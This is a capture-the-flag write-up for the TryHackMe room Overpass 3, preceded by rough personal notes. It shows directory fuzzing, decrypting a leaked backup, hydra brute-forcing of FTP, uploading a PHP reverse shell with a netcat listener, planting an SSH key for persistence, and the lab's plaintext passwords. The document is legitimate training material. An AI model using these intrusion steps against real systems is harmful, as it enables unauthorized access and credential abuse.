## Table of Contents

- [[Overpass 3 TryHackMe Writeup](https://shishirsubedi.com.np/thm/overpass3/)](#[overpass\3\tryhackme\writeup](https://shishirsubedi.com.np/thm/overpass3/))
- [Port Scanning with Nmap[Permalink](https://shishirsubedi.com.np/thm/overpass3/#port-scanning-with-nmap "Permalink")](#port\scanning\with\nmap[permalink](https://shishirsubedi.com.np/thm/overpass3/#port-scanning-with-nmap\"permalink"))
    - [All Port Scanning[Permalink](https://shishirsubedi.com.np/thm/overpass3/#all-port-scanning "Permalink")](#All\Port\Scanning[Permalink](https://shishirsubedi.com.np/thm/overpass3/#all-port-scanning\"Permalink"))
- [Nmap done at Wed Jan 13 20:34:47 2021 -- 1 IP address (1 host up) scanned in 74.60 seconds](#nmap\done\at\wed\jan\13\20:34:47\2021\--\1\ip\address\(1\host\up)\scanned\in\74.60\seconds)
    - [Detail Scan[Permalink](https://shishirsubedi.com.np/thm/overpass3/#detail-scan "Permalink")](#Detail\Scan[Permalink](https://shishirsubedi.com.np/thm/overpass3/#detail-scan\"Permalink"))
- [Nmap done at Wed Jan 13 20:40:31 2021 -- 1 IP address (1 host up) scanned in 45.47 seconds](#nmap\done\at\wed\jan\13\20:40:31\2021\--\1\ip\address\(1\host\up)\scanned\in\45.47\seconds)
- [FTP - Trying anonymous Login](#ftp\-\trying\anonymous\login)
- [HTTP Service on Port 80[Permalink](https://shishirsubedi.com.np/thm/overpass3/#http-service-on-port-80 "Permalink")](#http\service\on\port\80[permalink](https://shishirsubedi.com.np/thm/overpass3/#http-service-on-port-80\"permalink"))
- [Directory Bruteforcing using wfuzz[Permalink](https://shishirsubedi.com.np/thm/overpass3/#directory-bruteforcing-using-wfuzz "Permalink")](#directory\bruteforcing\using\wfuzz[permalink](https://shishirsubedi.com.np/thm/overpass3/#directory-bruteforcing-using-wfuzz\"permalink"))
  - [Visiting /backups from browser[Permalink](https://shishirsubedi.com.np/thm/overpass3/#visiting-backups-from-browser "Permalink")](#Visiting\/backups\from\browser[Permalink](https://shishirsubedi.com.np/thm/overpass3/#visiting-backups-from-browser\"Permalink"))
  - [Downloading and unzipping the file[Permalink](https://shishirsubedi.com.np/thm/overpass3/#downloading-and-unzipping-the-file "Permalink")](#Downloading\and\unzipping\the\file[Permalink](https://shishirsubedi.com.np/thm/overpass3/#downloading-and-unzipping-the-file\"Permalink"))
  - [Importing private key[Permalink](https://shishirsubedi.com.np/thm/overpass3/#importing-private-key "Permalink")](#Importing\private\key[Permalink](https://shishirsubedi.com.np/thm/overpass3/#importing-private-key\"Permalink"))
  - [Decrypting the file[Permalink](https://shishirsubedi.com.np/thm/overpass3/#decrypting-the-file "Permalink")](#Decrypting\the\file[Permalink](https://shishirsubedi.com.np/thm/overpass3/#decrypting-the-file\"Permalink"))
  - [Converting xlsx file to PDF using libreoffice[Permalink](https://shishirsubedi.com.np/thm/overpass3/#converting-xlsx-file-to-pdf-using-libreoffice "Permalink")](#Converting\xlsx\file\to\PDF\using\libreoffice[Permalink](https://shishirsubedi.com.np/thm/overpass3/#converting-xlsx-file-to-pdf-using-libreoffice\"Permalink"))
  - [Content of CustomerDetails.pdf[Permalink](https://shishirsubedi.com.np/thm/overpass3/#content-of-customerdetailspdf "Permalink")](#Content\of\CustomerDetails.pdf[Permalink](https://shishirsubedi.com.np/thm/overpass3/#content-of-customerdetailspdf\"Permalink"))
  - [Bruteforcing SSH using hydra[Permalink](https://shishirsubedi.com.np/thm/overpass3/#bruteforcing-ssh-using-hydra "Permalink")](#Bruteforcing\SSH\using\hydra[Permalink](https://shishirsubedi.com.np/thm/overpass3/#bruteforcing-ssh-using-hydra\"Permalink"))
  - [Bruteforcing FTP using hydra[Permalink](https://shishirsubedi.com.np/thm/overpass3/#bruteforcing-ftp-using-hydra "Permalink")](#Bruteforcing\FTP\using\hydra[Permalink](https://shishirsubedi.com.np/thm/overpass3/#bruteforcing-ftp-using-hydra\"Permalink"))
- [Enumerating FTP service[Permalink](https://shishirsubedi.com.np/thm/overpass3/#enumerating-ftp-service "Permalink")](#enumerating\ftp\service[permalink](https://shishirsubedi.com.np/thm/overpass3/#enumerating-ftp-service\"permalink"))
    - [Logging in with user paradox[Permalink](https://shishirsubedi.com.np/thm/overpass3/#logging-in-with-user-paradox "Permalink")](#Logging\in\with\user\paradox[Permalink](https://shishirsubedi.com.np/thm/overpass3/#logging-in-with-user-paradox\"Permalink"))
    - [Listing directories and files[Permalink](https://shishirsubedi.com.np/thm/overpass3/#listing-directories-and-files "Permalink")](#Listing\directories\and\files[Permalink](https://shishirsubedi.com.np/thm/overpass3/#listing-directories-and-files\"Permalink"))
    - [Uploading a test file[Permalink](https://shishirsubedi.com.np/thm/overpass3/#uploading-a-test-file "Permalink")](#Uploading\a\test\file[Permalink](https://shishirsubedi.com.np/thm/overpass3/#uploading-a-test-file\"Permalink"))
    - [Uploading PHP reverse shell[Permalink](https://shishirsubedi.com.np/thm/overpass3/#uploading-php-reverse-shell "Permalink")](#Uploading\PHP\reverse\shell[Permalink](https://shishirsubedi.com.np/thm/overpass3/#uploading-php-reverse-shell\"Permalink"))
  - [Listening on the local box[Permalink](https://shishirsubedi.com.np/thm/overpass3/#listening-on-the-local-box "Permalink")](#Listening\on\the\local\box[Permalink](https://shishirsubedi.com.np/thm/overpass3/#listening-on-the-local-box\"Permalink"))
    - [Hitting the shell.php on the webserver[Permalink](https://shishirsubedi.com.np/thm/overpass3/#hitting-the-shellphp-on-the-webserver "Permalink")](#Hitting\the\shell.php\on\the\webserver[Permalink](https://shishirsubedi.com.np/thm/overpass3/#hitting-the-shellphp-on-the-webserver\"Permalink"))
- [Privilege Escalation[Permalink](https://shishirsubedi.com.np/thm/overpass3/#privilege-escalation "Permalink")](#privilege\escalation[permalink](https://shishirsubedi.com.np/thm/overpass3/#privilege-escalation\"permalink"))
    - [Listing users on the box with login shell as bash[Permalink](https://shishirsubedi.com.np/thm/overpass3/#listing-users-on-the-box-with-login-shell-as-bash "Permalink")](#Listing\users\on\the\box\with\login\shell\as\bash[Permalink](https://shishirsubedi.com.np/thm/overpass3/#listing-users-on-the-box-with-login-shell-as-bash\"Permalink"))
    - [Shell as paradox[Permalink](https://shishirsubedi.com.np/thm/overpass3/#shell-as-paradox "Permalink")](#Shell\as\paradox[Permalink](https://shishirsubedi.com.np/thm/overpass3/#shell-as-paradox\"Permalink"))
    - [Generating SSH key pairs on local box[Permalink](https://shishirsubedi.com.np/thm/overpass3/#generating-ssh-key-pairs-on-local-box "Permalink")](#Generating\SSH\key\pairs\on\local\box[Permalink](https://shishirsubedi.com.np/thm/overpass3/#generating-ssh-key-pairs-on-local-box\"Permalink"))
    - [Copying our public key to paradox’s authorized_keys[Permalink](https://shishirsubedi.com.np/thm/overpass3/#copying-our-public-key-to-paradoxs-authorized_keys "Permalink")](#Copying\our\public\key\to\paradox’s\authorized_keys[Permalink](https://shishirsubedi.com.np/thm/overpass3/#copying-our-public-key-to-paradoxs-authorized_keys\"Permalink"))
    - [Logging as user paradox using SSH[Permalink](https://shishirsubedi.com.np/thm/overpass3/#logging-as-user-paradox-using-ssh "Permalink")](#Logging\as\user\paradox\using\SSH[Permalink](https://shishirsubedi.com.np/thm/overpass3/#logging-as-user-paradox-using-ssh\"Permalink"))
  - [Running linpeas.sh on the box[Permalink](https://shishirsubedi.com.np/thm/overpass3/#running-linpeassh-on-the-box "Permalink")](#Running\linpeas.sh\on\the\box[Permalink](https://shishirsubedi.com.np/thm/overpass3/#running-linpeassh-on-the-box\"Permalink"))
    - [Listing mount from our local box[Permalink](https://shishirsubedi.com.np/thm/overpass3/#listing-mount-from-our-local-box "Permalink")](#Listing\mount\from\our\local\box[Permalink](https://shishirsubedi.com.np/thm/overpass3/#listing-mount-from-our-local-box\"Permalink"))
    - [Listing listening Ports on the Server[Permalink](https://shishirsubedi.com.np/thm/overpass3/#listing-listening-ports-on-the-server "Permalink")](#Listing\listening\Ports\on\the\Server[Permalink](https://shishirsubedi.com.np/thm/overpass3/#listing-listening-ports-on-the-server\"Permalink"))

- Run an nmap scan: nmap -sCV -p- -T5 $ip -oN over.scan
- ```#!/usr/bin/bash
- Run gobuster
- gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
- go to /backup and download the zip file
- Import the GPG key
- `gpg --import priv.key`
- `gpg CustomerDetails.xlsx.gpg`
- try hydra one the FTP server
- `hydra -L uder.lst -P passwords.lst ftp://$ip
- Upload a PHP reverse shell to the ftp
- start a listender
- execute it by runnning curl http://$ip/rev-shell-name.php
- |   |
|---|
|`(remote)`<br><br>`python3 -c 'import pty; pty.spawn("/bin/bash")'`<br><br>`CTRL^Z to put it in the background`<br><br>`(local)`<br><br>`stty raw -echo; fg`<br><br>`(remote)`<br><br>`echo TERM=xterm-256color`<br><br>`reset`|

Now we have auto completion and will not losing our shell by hitting CRTL^C.

- find / 2>/dev/null | grep flag
Enumerate the users by reading the /etc/passwd file. or= ls -k /home/
- su paradox
- upload linpeas.sh
- chmod +x linpeas.sh
- ./linpeas.sh | linpeas.log

Username
paradox
0day
muirlandoracle
Password
ShibesAreGreat123
OllieIsTheBestDog
A11D0gsAreAw3s0me

add paradox ssh-key to attackbox, copy it over to box>
kali@kali$ ssh-keygen -f paradox
cat paradox.pub
echo '<paradox.pub/contents>' > /.ssh/authorized_keys

# [Overpass 3 TryHackMe Writeup](https://shishirsubedi.com.np/thm/overpass3/)

 January 14, 2021   9 minute read

![overpass](https://shishirsubedi.com.np/assets/images/thm/overpass3/overpass3.png)

[Overpass3](https://tryhackme.com/room/overpass3hosting) is a medium rated room by [NinjaJc01](https://tryhackme.com/p/NinjaJc01). A backup file was found on the webserver which contained few usernames and passwords which we used to login to the FTP server and found that the the FTP server was hosting the contents of the webserver and we also have a permission to write to that folder. A php script was uploaded which gave us a reverse shell as user apache. On the box NFS share was hosted with no_root_squash which was abused to get root shell on the box.

# Port Scanning with Nmap[Permalink](https://shishirsubedi.com.np/thm/overpass3/#port-scanning-with-nmap "Permalink")

### All Port Scanning[Permalink](https://shishirsubedi.com.np/thm/overpass3/#all-port-scanning "Permalink")

```
reddevil@ubuntu:~/Documents/tryhackme/overpass-3$ nmap -p- --min-rate 10000 -v -oN nmap/all-ports 10.10.44.38
Nmap scan report for 10.10.44.38
Host is up (0.43s latency).
Not shown: 65532 filtered ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
# Nmap done at Wed Jan 13 20:34:47 2021 -- 1 IP address (1 host up) scanned in 74.60 seconds
```

### Detail Scan[Permalink](https://shishirsubedi.com.np/thm/overpass3/#detail-scan "Permalink")

```
reddevil@ubuntu:~/Documents/tryhackme/overpass-3$ PORTS=`cat nmap/all-ports | grep -i open | awk -F'/' '{print $1}' | sed -z 's/\n/,/g' | sed -z 's/,$//g'`
reddevil@ubuntu:~/Documents/tryhackme/overpass-3$ nmap -p $PORTS -sC -sV -oN nmap/detail 10.10.44.38
Nmap scan report for 10.10.44.38
Host is up (0.39s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 de:5b:0e:b5:40:aa:43:4d:2a:83:31:14:20:77:9c:a1 (RSA)
|   256 f4:b5:a6:60:f4:d1:bf:e2:85:2e:2e:7e:5f:4c:ce:38 (ECDSA)
|_  256 29:e6:61:09:ed:8a:88:2b:55:74:f2:b7:33:ae:df:c8 (ED25519)
80/tcp open  http    Apache httpd 2.4.37 ((centos))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos)
|_http-title: Overpass Hosting
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jan 13 20:40:31 2021 -- 1 IP address (1 host up) scanned in 45.47 seconds
```

# FTP - Trying anonymous Login
```
reddevil@ubuntu:~/Documents/tryhackme/overpass-3$ ftp 10.10.1.43
Connected to 10.10.1.43.
220 (vsFTPd 3.0.3)
Name (10.10.1.43:reddevil): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp> 
```

Anonymous login was disabled.

# HTTP Service on Port 80[Permalink](https://shishirsubedi.com.np/thm/overpass3/#http-service-on-port-80 "Permalink")

![1](https://shishirsubedi.com.np/assets/images/thm/overpass3/1.png)

# Directory Bruteforcing using wfuzz[Permalink](https://shishirsubedi.com.np/thm/overpass3/#directory-bruteforcing-using-wfuzz "Permalink")

```
reddevil@ubuntu:~/Documents/tryhackme/overpass-3$ wfuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c --hc 404 http://10.10.1.43/FUZZ
********************************************************
* Wfuzz 3.0.3 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.1.43/FUZZ
Total requests: 220547

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                        
===================================================================

000011247:   301        7 L      20 W     234 Ch      "backups"
```

We find a directory named **backups**.

## Visiting /backups from browser[Permalink](https://shishirsubedi.com.np/thm/overpass3/#visiting-backups-from-browser "Permalink")

![2](https://shishirsubedi.com.np/assets/images/thm/overpass3/2.png)Directory listing is enabled on **/backups** and it contains a backup file called **backup.zip**.

## Downloading and unzipping the file[Permalink](https://shishirsubedi.com.np/thm/overpass3/#downloading-and-unzipping-the-file "Permalink")

![3](https://shishirsubedi.com.np/assets/images/thm/overpass3/3.png)

There are two files on the backup.zip file.

```
reddevil@ubuntu:~/Documents/tryhackme/overpass-3/backup$ ls -l
total 16
-rw-rw-r-- 1 reddevil reddevil 10366 Nov  9 03:03 CustomerDetails.xlsx.gpg
-rw------- 1 reddevil reddevil  3522 Nov  9 03:01 priv.key
```

Here we have a file which is encrpyted using gpg and a private key. Lets import the private key and decrypt the file.

## Importing private key[Permalink](https://shishirsubedi.com.np/thm/overpass3/#importing-private-key "Permalink")

![4](https://shishirsubedi.com.np/assets/images/thm/overpass3/4.png)

## Decrypting the file[Permalink](https://shishirsubedi.com.np/thm/overpass3/#decrypting-the-file "Permalink")

```
reddevil@ubuntu:~/Documents/tryhackme/overpass-3/backup$ gpg --decrypt CustomerDetails.xlsx.gpg > CustomerDetails.xlsx
gpg: encrypted with 2048-bit RSA key, ID 9E86A1C63FB96335, created 2020-11-08
      "Paradox <paradox@overpass.thm>"
```

And the file is successfully decrpypted.

## Converting xlsx file to PDF using libreoffice[Permalink](https://shishirsubedi.com.np/thm/overpass3/#converting-xlsx-file-to-pdf-using-libreoffice "Permalink")

```
reddevil@ubuntu:~/Documents/tryhackme/overpass-3/backup$ libreoffice --headless --convert-to pdf CustomerDetails.xlsx 
convert ~/Documents/tryhackme/overpass-3/backup/CustomerDetails.xlsx -> ~/Documents/tryhackme/overpass-3/backup/CustomerDetails.pdf using filter : calc_pdf_Export
```

## Content of CustomerDetails.pdf[Permalink](https://shishirsubedi.com.np/thm/overpass3/#content-of-customerdetailspdf "Permalink")

![5](https://shishirsubedi.com.np/assets/images/thm/overpass3/5.png)

We get some usernames and passwords. Since we do not have that much to look into HTTP, lets try to bruteforce on the SSH and FTP service using obtained credentials.

## Bruteforcing SSH using hydra[Permalink](https://shishirsubedi.com.np/thm/overpass3/#bruteforcing-ssh-using-hydra "Permalink")

![6](https://shishirsubedi.com.np/assets/images/thm/overpass3/6.png)SSH does not supports password based authentication which means we can only use SSH to login to the remote host using key based authentication.

## Bruteforcing FTP using hydra[Permalink](https://shishirsubedi.com.np/thm/overpass3/#bruteforcing-ftp-using-hydra "Permalink")

![7](https://shishirsubedi.com.np/assets/images/thm/overpass3/7.png)We get a hit on FTP server with user paradox. So, let’s login on the ftp server.

# Enumerating FTP service[Permalink](https://shishirsubedi.com.np/thm/overpass3/#enumerating-ftp-service "Permalink")

### Logging in with user paradox[Permalink](https://shishirsubedi.com.np/thm/overpass3/#logging-in-with-user-paradox "Permalink")

```
reddevil@ubuntu:~/Documents/tryhackme/overpass-3$ ftp 10.10.1.43
Connected to 10.10.1.43.
220 (vsFTPd 3.0.3)
Name (10.10.1.43:reddevil): paradox
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

### Listing directories and files[Permalink](https://shishirsubedi.com.np/thm/overpass3/#listing-directories-and-files "Permalink")

```
ftp> dir -a
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    3 48       48             94 Nov 17 23:54 .
drwxrwxrwx    3 48       48             94 Nov 17 23:54 ..
drwxr-xr-x    2 48       48             24 Nov 08 21:25 backups
-rw-r--r--    1 0        0           65591 Nov 17 20:42 hallway.jpg
-rw-r--r--    1 0        0            1770 Nov 17 20:42 index.html
-rw-r--r--    1 0        0             576 Nov 17 20:42 main.css
-rw-r--r--    1 0        0            2511 Nov 17 20:42 overpass.svg
226 Directory send OK.
```

Looking at the directory listing of the FTP server, it looks like the directory structure of the webserver. Lets check whether we have permission to upload a file on the FTP server or not and if we can upload the file, it will be reflected on the webserver and we can get code execution by uploading a PHP script.

### Uploading a test file[Permalink](https://shishirsubedi.com.np/thm/overpass3/#uploading-a-test-file "Permalink")

```
ftp> put test
local: test remote: test
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 48       48             24 Nov 08 21:25 backups
-rw-r--r--    1 0        0           65591 Nov 17 20:42 hallway.jpg
-rw-r--r--    1 0        0            1770 Nov 17 20:42 index.html
-rw-r--r--    1 0        0             576 Nov 17 20:42 main.css
-rw-r--r--    1 0        0            2511 Nov 17 20:42 overpass.svg
-rw-r--r--    1 1001     1001            0 Jan 14 07:18 test
226 Directory send OK.
```

We have successfully uploaded a test file and the file is uploaded as a user with UID 1001.

### Uploading PHP reverse shell[Permalink](https://shishirsubedi.com.np/thm/overpass3/#uploading-php-reverse-shell "Permalink")

```
reddevil@ubuntu:~/Documents/tryhackme/overpass-3$ locate php-reverse-shell.php
/usr/share/wordlists/Seclists/Web-Shells/laudanum-0.8/php/php-reverse-shell.php
```

Download from [https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell) if you do not have it on your box.

```
ftp> put shell.php
local: shell.php remote: shell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5493 bytes sent in 0.00 secs (27.8645 MB/s)
ftp>
```

## Listening on the local box[Permalink](https://shishirsubedi.com.np/thm/overpass3/#listening-on-the-local-box "Permalink")

```
reddevil@ubuntu:~/Documents/tryhackme/overpass-3$ nc -nvlp 8888
Listening on 0.0.0.0 8888
```

### Hitting the shell.php on the webserver[Permalink](https://shishirsubedi.com.np/thm/overpass3/#hitting-the-shellphp-on-the-webserver "Permalink")

![8](https://shishirsubedi.com.np/assets/images/thm/overpass3/8.png)

We get a shell back as user apache.

# Privilege Escalation[Permalink](https://shishirsubedi.com.np/thm/overpass3/#privilege-escalation "Permalink")

### Listing users on the box with login shell as bash[Permalink](https://shishirsubedi.com.np/thm/overpass3/#listing-users-on-the-box-with-login-shell-as-bash "Permalink")

```
bash-4.4$ cat /etc/passwd | grep -i bash
cat /etc/passwd | grep -i bash
root:x:0:0:root:/root:/bin/bash
james:x:1000:1000:James:/home/james:/bin/bash
paradox:x:1001:1001::/home/paradox:/bin/bash
```

Since paradox is a user on the box, lets try to change user from apache to paradox.

### Shell as paradox[Permalink](https://shishirsubedi.com.np/thm/overpass3/#shell-as-paradox "Permalink")

```
bash-4.4$ su paradox
su paradox
Password: S*************3

[paradox@localhost /]$ id
id
uid=1001(paradox) gid=1001(paradox) groups=1001(paradox)
```

And we get a shell as user paradox. This shell is hard to work with and we can only login on SSH using key based authentication. So lets generate a key pair and login on the box as user paradox.

### Generating SSH key pairs on local box[Permalink](https://shishirsubedi.com.np/thm/overpass3/#generating-ssh-key-pairs-on-local-box "Permalink")

![9](https://shishirsubedi.com.np/assets/images/thm/overpass3/9.png)

### Copying our public key to paradox’s authorized_keys[Permalink](https://shishirsubedi.com.np/thm/overpass3/#copying-our-public-key-to-paradoxs-authorized_keys "Permalink")

```
[paradox@localhost ~]$ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDC3hlHyLwhFwfeMeYB8jee775OSPsxsU1v7p5jt5705NTjjPpR1UinjcrDYjPDFcyM/vcRJ7teaFWH67FlMvyPo5aW2YH6425LtiG0f0w3sM2u+PIjLcYiKgL4lnp4+SNW7S1svBBhPQbMsW3FkD8R2mWv+2gDEzNzskxLO8jLRNUlkXZjS6fuVzZ3isQz4oGPB5ds6suFjgyP3bCC2IIOw2ZIlv4LvgUM78e57KiLutp6z9dSHmFnM35qgvJGsgE+R1WLjVPWEp4GOumFOpg2Sq/X8cHA0Zf07sG0fhS5TMjczH4+dOflMlSZQJyzBiZqI6uGAj+YiWGsmukqXFAlBzVcmQtreB/MCkYXNMqQhjtqevMU4UynA9MGe0nYzfbLpueUs9nQdKRs5BqTHNcLA3nWDCpz8oJSh6GiUYzKb8kFjmI3g+u7O9tsxFmWiU1RrUpIEklN0Gi0nZOrFDaOggxXmaXz/GuF3gT/9ZwtuGfQcV873zWLh6W1b+qDz5E= reddevil@ubuntu' > .ssh/authorized_keys
<6W1b+qDz5E= reddevil@ubuntu' > .ssh/authorized_keys
```

### Logging as user paradox using SSH[Permalink](https://shishirsubedi.com.np/thm/overpass3/#logging-as-user-paradox-using-ssh "Permalink")

```
reddevil@ubuntu:~/Documents/tryhackme/overpass-3$ chmod 600 paradox
reddevil@ubuntu:~/Documents/tryhackme/overpass-3$ ssh -i paradox paradox@10.10.1.43
The authenticity of host '10.10.1.43 (10.10.1.43)' can't be established.
ECDSA key fingerprint is SHA256:Zc/Zqa7e8cZI2SP2BSwt5iLz5wD3XTxIz2SLZMjoJmE.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.1.43' (ECDSA) to the list of known hosts.
Last login: Thu Jan 14 08:12:22 2021
[paradox@localhost ~]$ id
uid=1001(paradox) gid=1001(paradox) groups=1001(paradox)
```

## Running linpeas.sh on the box[Permalink](https://shishirsubedi.com.np/thm/overpass3/#running-linpeassh-on-the-box "Permalink")

![10](https://shishirsubedi.com.np/assets/images/thm/overpass3/10.png)

We can see a NFS share is hosted by the server, i.e. home directory of user james and **no_root_squash** is enabled. It means that if the share is mounted on our local device and if we create a file using root user, the file permissions also remain same for the remote server too.

### Listing mount from our local box[Permalink](https://shishirsubedi.com.np/thm/overpass3/#listing-mount-from-our-local-box "Permalink")

```
reddevil@ubuntu:~/Documents/tryhackme/overpass-3$ showmount -e 10.10.1.43
clnt_create: RPC: Unable to receive
```

If we check the Nmap result from the full port scan, the port listening for NFS, ie 2049 was closed.

### Listing listening Ports on the Server[Permalink](https://shishirsubedi.com.np/thm/overpass3/#listing-listening-ports-on-the-server "Permalink")

```
[paradox@localhost ~]$ ss -ltn
State            Recv-Q           Send-Q                      Local Address:Port                        Peer Address:Port           
LISTEN           0                128                               0.0.0.0:22                               0.0.0.0:*              
LISTEN           0                64                                0.0.0.0:40473                            0.0.0.0:*              
LISTEN           0                64                                0.0.0.0:2049                             0.0.0.0:*              
LISTEN           0                128                               0.0.0.0:49701                            0.0.0.0:*              
LISTEN           0                128                               0.0.0.0:111                              0.0.0.0:*              
LISTEN           0                128                               0.0.0.0:20048                            0.0.0.0:*              
LISTEN           0                128                                  [::]:22                                  [::]:*              
LISTEN           0                64                                   [::]:38011                               [::]:*              
LISTEN           0                64                                   [::]:2049                                [::]:*              
LISTEN           0                128                                  [::]:111                                 [::]:*              
LISTEN           0                128                                  [::]:20048                               [::]:*              
LISTEN           0                128                                     *:80                                     *:*              
LISTEN           0                128                                  [::]:34517                               [::]:*              
LISTEN           0                32                                      *:21 
```

But on the server, port 2049 is open on all interfaces (0.0.0.0) but we are not able to connect to it which means it is behind some firewall. So, lets use SSH for port tunneling.

command to find any .flag file, echo <flag file>  -> cat to stdoutput 
find / -type f -iname '*.flag*' -exec echo {} \; -exec cat {} \; 2>/dev/null


